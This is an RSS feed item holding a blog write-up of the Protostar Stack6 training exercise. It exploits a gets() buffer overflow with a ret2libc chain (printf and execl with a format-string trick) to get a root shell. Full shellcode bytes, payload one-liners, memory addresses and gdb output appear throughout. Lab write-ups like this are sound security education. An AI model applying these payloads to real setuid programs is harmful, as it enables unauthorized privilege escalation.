<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Ret2libc on Matt Andreko</title>
    <link>https://www.mattandreko.com/categories/ret2libc/index.xml</link>
    <description>Recent content in Ret2libc on Matt Andreko</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-US</language>
    <atom:link href="https://www.mattandreko.com/categories/ret2libc/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Exploit Exercises - Protostar Stack 6</title>
      <link>https://www.mattandreko.com/blog/2011-12-22-exploit-exercises-protostar-stack-6/</link>
      <pubDate>Thu, 22 Dec 2011 06:02:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2011-12-22-exploit-exercises-protostar-stack-6/</guid>
      <description>&lt;p&gt;The &lt;a href=&#34;http://exploit-exercises.com/protostar/stack6&#34;&gt;Stack6&lt;/a&gt; challenge was definitely a learning   experience for me.  This actually went beyond my existing skills, and made me learn some new stuff.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;We are given the following code.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

void getpath()
{
        char buffer[64];
        unsigned int ret;

        printf(&amp;quot;input path please: &amp;quot;); fflush(stdout);

        gets(buffer);

        ret = __builtin_return_address(0);

        if((ret &amp;amp; 0xbf000000) == 0xbf000000) {
                printf(&amp;quot;bzzzt (%p)\n&amp;quot;, ret);
                _exit(1);
        }

        printf(&amp;quot;got path %s\n&amp;quot;, buffer);
}

int main(int argc, char **argv)
{
        getpath();



}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The first thing I tried to do, was to set it up just like I did on Stack 5.&lt;/p&gt;

&lt;p&gt;First, I needed to find the offset (using a locally copied version, since the real one was suid and wouldn&amp;rsquo;t dump a core):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko@li225-134:/opt/framework-4.0.0/msf3/tools$ ./pattern_create.rb 128
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7A

d8Ad9Ae0Ae1Ae

user@protostar:~$ ./stack6
input path please: 

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7A

d8Ad9Ae0Ae1Ae
got path 

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7A

d8Ad9Ae0Ae1Ae
Segmentation fault (core dumped)
user@protostar:~$ gdb --quiet --core=/tmp/core.11.stack6.2279
Core was generated by `./stack6&#39;.
Program terminated with signal 11, Segmentation fault.
#0  0x37634136 in ?? ()

mandreko@li225-134:/opt/framework-4.0.0/msf3/tools$ ./pattern_offset.rb 0x37634136
80
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Great, so now we know the EIP offset is 80 bytes.  I for some reason, just wanted to verify it, and also see if I   had some space after the return address for shellcode.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ echo `perl -e &#39;print &amp;quot;A&amp;quot;x80 . &amp;quot;\xEF\xBE\xAD\xDE&amp;quot; . &amp;quot;C&amp;quot;x100&#39;` | ./stack6
input path please: got path 

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ▒AAAAAAAAAAAAﾭ▒CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
Segmentation fault (core dumped)
user@protostar:~$ gdb --quiet --core=/tmp/core.11.stack6.2316
Core was generated by `./stack6&#39;.
Program terminated with signal 11, Segmentation fault.
#0  0xdeadbeef in ?? ()
(gdb) x/10s $esp
0xbffff7f0:      &#39;C&#39; &amp;lt;repeats 100 times&amp;gt;
0xbffff855:      &amp;quot;&amp;quot;
0xbffff856:      &amp;quot;&amp;quot;
0xbffff857:      &amp;quot;&amp;quot;
0xbffff858:      &amp;quot;\001&amp;quot;
0xbffff85a:      &amp;quot;&amp;quot;
0xbffff85b:      &amp;quot;&amp;quot;
0xbffff85c:      &amp;quot;Ѓ\004\b&amp;quot;
0xbffff861:      &amp;quot;&amp;quot;
0xbffff862:      &amp;quot;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yep, my 100 &amp;ldquo;C&amp;rdquo;s came through fine.  I definitely have some space if I need it.  So I simply used the start of the   &amp;ldquo;C&amp;rdquo;s as my return address, added a little bit of space with a 16 byte NOP sled, and then added shellcode (generated   from msfpayload with badchars taken out).  I wasn&amp;rsquo;t sure what the provided C code was doing yet, as I&amp;rsquo;m not really   a C developer, and figured I&amp;rsquo;d learn in time.  This was when I learned.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ perl -e &#39;print &amp;quot;A&amp;quot;x80 . &amp;quot;\xf0\xf7\xff\xbf&amp;quot; . &amp;quot;\x90&amp;quot;x16 . &amp;quot;\xdb\xc8\xd9\x74\x24\xf4\xba\x2a

\xa1\xa4\x48\x5d\x29\xc9\xb1\x10\x31\x55\x17\x83\xed\xfc\x03\x7f\xb2\x46\xbd\x4e\x7d\xb7\xe5\x47\x9e\x08\xbd\x6a

\xe1\x03\xb5\x2c\x7b\x81\xaf\xa4\x56\x45\xb9\xd3\xc1\xa6\xca\x73\x12\xd1\x03\xe1\x7b\x4f\xd5\x06\x29\x67\xed

\xc8\xce\x77\xc1\xaa\xa7\x19\x32\x59\x50\xe6\x1b\xce\x29\x07\x6e\x70\x18\x13\x1b\x71\x03\x6e\x5c&amp;quot;&#39; &amp;gt; 

/home/user/file
user@protostar:~$ ./stack6 &amp;lt; file
input path please: bzzzt (0xbffff7f0)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So the C code was actually making sure that the return address was not somewhere in the stack (starting with &amp;ldquo;\xbf&amp;rdquo;).  This is problematic, since my shellcode is in the stack, specifically near 0xbffff7f0. This means I had to learn how to get around this.&lt;/p&gt;

&lt;p&gt;I had heard of some of the fun buzzwords listed on the Stack6 page: ret2libc, and Return-Oriented Programming.  For   some reason, I didn&amp;rsquo;t make the connection between Return-Oriented Programming and the buzzword I&amp;rsquo;ve been seeing   everywhere, &amp;ldquo;ROP&amp;rdquo;.  Call me dumb, but I didn&amp;rsquo;t see it until mostly done with this.  I read a TON of sites, but some that I found useful were:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.corelan.be&#34;&gt;Corelan&lt;/a&gt; - These guys are geniuses. Watch some videos that corelanc0d3r gives. You&amp;rsquo;ll be amazed. And he also gave us &lt;a href=&#34;http://redmine.corelan.be/projects/mona&#34;&gt;mona.py&lt;/a&gt;, so he deserves praise.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.win.tue.nl/~aeb/linux/hh/hh-10.html&#34;&gt;Hackers Hut&lt;/a&gt; - This page was so useful for me getting execl working.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://sickness.tor.hu&#34;&gt;IHASOMGSECURITYSKILLS&lt;/a&gt; - If you&amp;rsquo;re ever on freenode in #offsec, you&amp;rsquo;ll often see sickn3ss there.  His linux exploitation guides are amazing&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So now I knew that I was going to need to at least use ret2libc, or maybe even ROP to call &amp;lsquo;execl(&amp;ldquo;/bin/bash&amp;rdquo;, &amp;ldquo;/bin/bash&amp;rdquo;, 0)&amp;rsquo;. I learned after experimenting quite a bit, that you can&amp;rsquo;t use &amp;lsquo;system(&amp;ldquo;/bin/bash&amp;rdquo;)&amp;rsquo;, because the call will lose the SUID permissions. I would get my bash shell, but it&amp;rsquo;d always have the same permissions as I already had. The next step would be to find out where in libc execl and other neccessary functions were stored in memory.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ gdb ./stack6 --quiet
Reading symbols from /opt/protostar/bin/stack6...done.
(gdb) break main
Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
(gdb) run
Starting program: /opt/protostar/bin/stack6

Breakpoint 1, main (argc=1, argv=0xbffff844) at stack6/stack6.c:27
27      stack6/stack6.c: No such file or directory.
        in stack6/stack6.c
(gdb) print printf
$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0xb7eddf90 &amp;lt;__printf&amp;gt;
(gdb) print execl
$2 = {&amp;lt;text variable, no debug info&amp;gt;} 0xb7f2e460 &amp;lt;*__GI_execl&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I looked up printf as well as execl, because with the help of the Hackers Hut link, I found that I could not pass a   &amp;ldquo;0&amp;rdquo; as an argument, so I needed to use a printf hack instead.  So my buffer overflow went from:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;| buffer (80) | return code | shellcode |
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;to&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;| buffer (80) | printf | execl | formatstring | prg | prg | here |
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To explain, I was still going to pass the 80 bytes to get to the EIP, but instead of jumping to the stack where my shellcode was stored, I would instead execute instructions.  Specifically &amp;lsquo;execl(prg, prg, 0)&amp;rsquo;, with a printf wrapper to bypass the &amp;ldquo;0&amp;rdquo; going into memory.  The &amp;ldquo;here&amp;rdquo; value is needs to have the value of the memory address it&amp;rsquo;s being entered to. For example, if &amp;ldquo;here&amp;rdquo; is located at 0xbfff0c14, it needs to contain the value 0xbfff0c14. It&amp;rsquo;s part of the printf hack.&lt;/p&gt;

&lt;p&gt;So now we have the buffer, the memory addresses of &amp;ldquo;printf&amp;rdquo; and &amp;ldquo;execl&amp;rdquo;.  Let&amp;rsquo;s put our format string and desired program together.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ export FORMATSTRING=&amp;quot;%3\$n&amp;quot;
user@protostar:~$ export FAV=&amp;quot;/home/user/fav&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;NOTE: When reading through the Hackers Hut article, it would make it sound like you could export the formatstring as &amp;ldquo;%3$n&amp;rdquo;, but bash tries to interpret the dollar sign, so I had to escape it with a backslash. Additionally, instead of calling the code from fav.c, I used the &lt;a href=&#34;http://www.exploit-db.com/exploits/13357&#34;&gt;shellcode&lt;/a&gt; I used in Stack 5, since it fixed the gets() issue.  I compiled it as &amp;ldquo;fav&amp;rdquo; for some reason.&lt;/p&gt;

&lt;p&gt;I then use a program that I found in the &lt;a href=&#34;http://www.amazon.com/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441&#34;&gt;Hacking: The Art of Exploitation&lt;/a&gt; book to get me the memory addresses of the environmental variables when called by a program.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char *argv[]) {
        char *ptr;
        if(argc &amp;lt; 3) {
                printf(&amp;quot;Usage: %s &amp;lt;environment var&amp;gt; &amp;lt;target program name&amp;gt;\n&amp;quot;, argv[0]);
                exit(0);
        }

        ptr = getenv(argv[1]); /* Get env var location. */
        ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
        printf(&amp;quot;%s will be at %p\n&amp;quot;, argv[1], ptr);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I then called it to get the actual values&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ /home/user/getenvaddr FORMATSTRING ./stack6
FORMATSTRING will be at 0xbffff9a5
user@protostar:/opt/protostar/bin$ /home/user/getenvaddr FAV ./stack6
FAV will be at 0xbfffff5a
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The last thing I needed, was the &amp;ldquo;here&amp;rdquo; memory address.  I took the source of stack6.c and compiled it to my home   directory, but with one small change.  I added a printf to show the location of the buffer in memory.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

void getpath()
{
        char buffer[64];
        unsigned int ret;

        printf(&amp;quot;input path please: &amp;quot;); fflush(stdout);

        gets(buffer);

        printf(&amp;quot;0x%08x\n&amp;quot;, buffer);

        ret = __builtin_return_address(0);

        if((ret &amp;amp; 0xbf000000) == 0xbf000000) {
                printf(&amp;quot;bzzzt (%p)\n&amp;quot;, ret);
                _exit(1);
        }

        printf(&amp;quot;got path %s\n&amp;quot;, buffer);
}

int main(int argc, char **argv)
{
        getpath();



}
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ gcc -fno-stack-protector -o stackx stack6.c
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Because of the stack being different because of the folder I was in, I navigated to where the real stack6.c was, and then ran my tests.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ cd /opt/protostar/bin/
user@protostar:/opt/protostar/bin$ /home/user/stackx
input path please: A
0xbffff75c
got path A
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So I know the address of buffer in stackx was 0xbffff75c.  However, this won&amp;rsquo;t be exactly right for the real   version.  I then used gdb to see the changes.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ gdb --quiet /home/user/stackx
Reading symbols from /home/user/stackx...(no debugging symbols found)...done.
(gdb) break getpath
Breakpoint 1 at 0x804848a
(gdb) run
Starting program: /home/user/stackx

Breakpoint 1, 0x0804848a in getpath ()
(gdb) x/4000s $esp
...
0xbffff977:      &amp;quot;/home/user/stackx&amp;quot;
...
0xbfffffea:      &amp;quot;/home/user/stackx&amp;quot;
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So the buffer was at 0xbfff75c, but there will be an offset. &amp;ldquo;/home/user/stackx&amp;rdquo; is 17 bytes long. &amp;ldquo;/opt/protostar/bin/stack6&amp;rdquo; is 25 bytes long. That&amp;rsquo;s a difference of 8 bytes. Since this is shown twice in memory, that&amp;rsquo;s a total of 16 bytes. We also will need to account for the 80 &amp;ldquo;A&amp;rdquo;s we&amp;rsquo;re putting in for the EIP offset, and   20 chars for the ret2libc commands.  So let&amp;rsquo;s add it up.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ perl -e &#39;printf(&amp;quot;0x%08x\n&amp;quot;, 0xbfff75c + 16 + 80 + 20)&#39;
0x0bfff7d0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So now we have all the info we need.  Again, we wanted to get to:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;| buffer (80) | printf | execl | formatstring | prg | prg | here |
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I wired it all up together with the values that we received.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$cd /opt/protostar/bin
user@protostar:/opt/protostar/bin$perl -e &#39;print &amp;quot;A&amp;quot;x80 . &amp;quot;\x90\xdf\xed\xb7&amp;quot; . &amp;quot;\x60\xe4\xf2\xb7&amp;quot; . &amp;quot;\xa5\xf9\xff

\xbf&amp;quot; . &amp;quot;\x5a\xff\xff\xbf&amp;quot; . &amp;quot;\x5a\xff\xff\xbf&amp;quot; . &amp;quot;\xd0\xf7\xff\xbf&amp;quot;&#39; %gt; /home/user/file
user@protostar:/opt/protostar/bin$ ./stack6 &amp;lt; /home/user/file
input path please: got path 

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA▒▒▒AAAAAAAAAAAA▒▒▒`▒▒▒▒▒Z▒▒▒Z▒▒▒▒▒▒▒
# whoami
root
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
  </channel>
</rss>